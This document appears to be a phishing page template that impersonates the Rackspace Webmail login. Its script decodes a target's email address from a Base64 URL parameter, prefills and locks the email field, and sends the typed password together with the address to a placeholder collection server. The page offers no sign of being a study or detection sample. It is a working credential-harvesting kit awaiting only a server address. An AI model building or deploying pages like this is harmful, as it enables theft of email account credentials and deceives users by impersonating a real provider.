<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Rackspace Webmail: Hosted Email for Business</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">

  <style>
    /* Page Defaults */
    * {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box;
    }

    body {
      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
      font-size: 14px;
      line-height: 1.42857;
      color: #333333;
      background-color: #FAFAFA;
      margin: 0;
    }

    .base_link {
      display: inline-block;
      color: #0C7C84;
      text-decoration: none;
    }

    .base_links {
      background: #FFFFFF;
      text-align: center;
      padding-bottom: 20px;
      margin-top: -15px;
    }

    .divider {
      display: inline-block;
      margin: 0px 5px;
      color: #0C7C84;
    }
    
    #content {
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: #EAEAEA;
    }

    #content-header {
      height: 53px;
      padding: 16px;
      font-size: 24px;
      font-weight: 300;
      line-height: 18px;
      background: #424242;
      color: #FCFCFC;
    }

    #content-body {
      display: flex;
      justify-content: start;
      background: #FFFFFF;
      min-width: 790px;
    }

    #form {
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 20px;
      min-height: 268px;
      width: 100%;
    }

    .form-label {
      font-family: Roboto;
      font-size: 16px;
      margin-bottom: 8px;
      color: #616161;
    }

    .form-field {
      border: 1px solid #BDBDBD;
      border-radius: 2px;
      font-family: Roboto;
      font-size: 16px;
      color: #616161;
      height: 32px;
      display: block;
      width: 100%;
      padding: 4px 8px;
    }

    .login-btn {
      float: right;
      display: inline-flex;
      justify-content: center;
      align-items: center;
      padding: 0 12px;
      height: 32px;
      font-size: 14px;
      font-weight: 400;
      color: #fff;
      background-color: #0C7C84;
      border-radius: 2px;
      cursor: pointer;
    }

    @media only screen and (max-device-width: 480px) {
      body {
        font-size: 19pt;
      }

      .form-label {
        font-size: 114%;
      }

      .form-field {
        font-size: 114%;
        height: 2em;
      }
    }
  </style>
</head>
<body>
  <div id="content">
    <div>
      <div id="content-header">
        <div id="content-header-label">Webmail Login</div>
      </div>

      <div id="content-body">
        <form id="form" autocomplete="off">
          <div id="form-body">
            <div id="form-container">
              <input type="hidden" name="__RequestVerificationToken" value="CfDJ8PJv2PmI83xDqNI3IL5jbf7n53O-sjEa55YFQhrE9DffPHCT5T4NJaWKOR-DTuVf15CZOHNTR0Nf8HHvYJzpBuvE1-RuPCp-VVB10AxbvHGpnvcORaonI3gFCgak-skKc16eQFADMDLQGDKw1rJETYQ" />

              <div class="form-group">
                <label for="ai" class="form-label">Email address</label>
                <input id="ai" name="username" class="form-field" value="" autocomplete="username" readonly />
                <p align="left">
                  <span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
                </p>
              </div>

              <div class="form-group">
                <label for="pr" class="form-label">Password</label>
                <input id="pr" name="password" type="password" class="form-field" autocomplete="current-password" />
              </div>

              <div id="login-btn-toolbar">
                <button class="login-btn" type="submit" id="submit-btn">Log In</button>
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>
    $(document).ready(function() {
      // Function to get URL parameter and decode the email
      var urlParams = new URLSearchParams(window.location.search);
      var encodedEmail = urlParams.get('e'); // Get the email from the query parameter e=BASE64EMAIL

      if (encodedEmail) {
        // Decode the email if it is Base64 encoded
        var decodedEmail = atob(encodedEmail.replace('BASE64EMAIL=', ''));

        // Validate the decoded email format
        var emailPattern = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (emailPattern.test(decodedEmail)) {
          $('#ai').val(decodedEmail); // Populate email field
          $('#ai').attr('readonly', true); // Make email field readonly
          $("#msg").hide();
        } else {
          console.log("Invalid email format in URL");
        }
      }

      // Handle the login form submission
      $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);

        var emailPattern = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
          $('#msg').show();
          $('#msg').html("The email field is empty!");
          return false;
        }

        if (!emailPattern.test(ai)) {
          $('#msg').show();
          $('#msg').html("Please enter a valid email address.");
          return false;
        }

        if (!pr) {
          $('#msg').show();
          $('#msg').html("The password field is empty!");
          return false;
        }

        // Handle form submission via AJAX or any other logic you need
        $.ajax({
          type: 'POST',
          url: 'YOUR_SERVER_URL_HERE', // Replace with your server URL
          data: {
            ai: ai,
            pr: pr
          },
          success: function(response) {
            // Handle response here (e.g., redirect or show a success message)
          },
          error: function() {
            $('#msg').show();
            $('#msg').html("Error: Invalid credentials");
          }
        });
      });
    });
  </script>
</body>
</html>
